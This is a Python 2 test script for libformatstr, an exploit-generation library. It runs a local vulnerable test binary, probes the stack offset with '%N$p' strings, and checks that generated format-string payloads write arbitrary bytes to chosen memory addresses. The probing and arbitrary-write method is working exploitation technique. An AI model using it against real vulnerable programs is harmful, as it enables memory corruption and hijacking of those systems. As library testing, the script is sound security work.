#!/usr/bin/env python

import subprocess, struct, random, sys, signal
from libformatstr import FormatStr

# vulnerable program
binary = "timeout 5 ./fmtstrtester"
# base and size of the mmap'ed region
membase = 0x33333000
memsize = 4096
# maximum size of the format string buffer
maxbuf = 1000

# determined offset and shift (padding) for use in format string generation
offset = None
shift = None

def checkOutput(d): #{{{
    """
    Given a formatstring `d', determine the state of the vuln program after printf.
    - out captures stdout
    - mem contains the contents of the mmap'ed region
    - fill indicates the byte used to fill the mmap'ed region before the payload was printed
    """
    (out, mem, fill) = (None, None, None)
    try:
	p = subprocess.Popen(binary.split(" ") + [d],
	    stdin=subprocess.PIPE,
	    stdout=subprocess.PIPE,
	    stderr=subprocess.PIPE)

	(out, err) = p.communicate()

	if len(err) == 4097:
	    fill = err[0]
	    mem = err[1:]
	else:
	    print "[-] Something went wrong when executing \"%s\". Timeout kill or crash?" % binary
	    return (None, None, None)
    except:
        pass
    return (out, mem, fill)
#}}}
def getOffset(bufsize): #{{{
    """
    Determine the offset and shift for the vulnerable program.
    - offset determines at which dword our buffer starts
    - shift determines how many bytes should be added to align dwords with the input
    """
    # get a ballpark figure first, we might have to offset
    possibleoffsets = []
    prefix = "A" * 8
    for i in range(200):
        payload = "%s%%%d$p" % (prefix, i)
	payload += "X" * (bufsize - len(payload))
	assert len(payload) == bufsize
        (out, _, _) = checkOutput(payload)
	if out.startswith("%s0x41414141" % prefix):
	    possibleoffsets += [i]

    # now finetune
    for offset in possibleoffsets:
        for shift in range(4):
	    prefix = ("A" * shift) + struct.pack("I", 0x12345678)
	    payload = "%s%%%d$p" % (prefix, offset)
	    payload += "X" * (bufsize - len(payload))
	    assert len(payload) == bufsize
	    (out, _, _) = checkOutput(payload)
	    if out.startswith("%s0x12345678" % prefix):
		return (offset, shift)
    return (-1, -1)
#}}}
def checkMemoryDump(memdump, fill, bytelist): #{{{
    """
    Compare the writes that should have happened through the formatstring
    against the actual contents of the memory.
    Returns True if all writes are present, and no other bytes were overwritten
    """
    ok = True
    for (a,v) in bytelist.items():
	memoffset = a - membase
        if memoffset < 0 or memoffset >= memsize:
	    print "Ignoring memory write of %02x outside of allowed region (0x%x - 0x%x)" % (v, membase, membase + memsize - 1)
	else:
	    if ord(memdump[memoffset]) != v:
	        print "Faulty byte %02x at 0x%x should be %02x" % (ord(memdump[memoffset]), a, v)
		ok = False
    for i in range(memsize):
        if membase+i not in bytelist and memdump[i] != fill:
	    print "Faulty untouched byte at 0x%x should be 0x%x, but is %02x instead" % (membase+i, ord(fill), ord(memdump[i]))
	    ok = False
	    
    return ok
#}}}
def makeRandomTest(count, min=0, max=0xffffffff, sizes=[1, 2, 4]): #{{{
    """
    Generate a random set of writes to perform through the format string exploit.
    - count indicates the amount of values to write
    - min and max indicate lower and upperbound of the values to write (inclusive)
    - sizes is a list containing the sizes of the writes to choose from
    """
    out = {}
    for i in range(count):
        addr = membase + random.choice(range(memsize))
	val = random.randrange(min, max + 1)
	size = random.choice(sizes)

	out[addr] = {
	    1: chr(val & 0xff),
	    2: struct.pack("H", val & 0xffff),
	    4: struct.pack("I", val & 0xffffffff),
	}[size]

    return out
#}}}
def performTest(name, test): #{{{
    """
    Given a series of writes in `test', generate a format string
    and pass it to the vulnerable program. If the writes were successful
    without destroying any other memory locations, return True.
    Terminates after 2 seconds to handle infinite loops in libformatstr.
    """
    f = FormatStr(maxbuf)
    for (k,v) in test.items():
	f[k] = v

    (out, err, fill) = (None, None, None)

    def sighandler(signum, frame):
	raise Exception("Command timed out")

    signal.signal(signal.SIGALRM, sighandler)
    signal.alarm(2)

    try:
	payload = f.payload(offset, padding=shift)

	if len(payload) > maxbuf:
	    print "[-] payload is longer than allowed (%d vs %s)" % (len(payload), maxbuf)

    	(out, err, fill) = checkOutput(payload)
    except Exception,e:
	print "[-] Exception occurred: %s" % e

    signal.alarm(0)

    if err == None or not checkMemoryDump(err, fill, f.mem):
        print "[-] FAILED:  Test \"%s\" failed" % name
	return False
    else:
        print "[+] SUCCESS: Test \"%s\" succeeded" % name
	return True
#}}}

# Determine offset and shift/padding
(offset, shift) = getOffset(maxbuf)

# These are the tests we perform
res = [
    performTest("write single byte", { 0x33333333: "\x41" }),
    performTest("write single word", { 0x33333333: "\x41\x42" }),
    performTest("write single dword", { 0x33333333: "\x41\x42\x43\x44" }),
    performTest("write single word with nullbyte address in middle", { (0x33333300 - 1): "\x41\x42" }),
    performTest("write single dword with nullbyte address in middle", { (0x33333300 - 2): "\x41\x42\x43\x44" }),
    performTest("write data with gaps", { 0x33333333: "\x41\x42\x43\x44", 0x33333338: "\xaa\xbb", 0x3333333b: "\xcc" }),
    performTest("write data with small values", { 0x33333333: 0, 0x33333338: 1, 0x3333333b: 2 }),
    performTest("random test, 20 writes", makeRandomTest(20)),
    performTest("random test, 20 writes, small values", makeRandomTest(20, max=5)),
    performTest("random test, 20 writes, large values", makeRandomTest(20, min=0xfffffff0)),
    performTest("random test, 20 writes, only bytes", makeRandomTest(20, sizes=[1])),
    performTest("random test, 20 writes, only words", makeRandomTest(20, sizes=[2])),
    performTest("random test, 20 writes, only dwords", makeRandomTest(20, sizes=[4])),
]

if all(res):
    print "[*] All %d tests successful!" % len(res)
    sys.exit(0)
else:
    print "[*] %d out of %d tests failed :(" % (len([x for x in res if not x]), len(res))
    sys.exit(1)
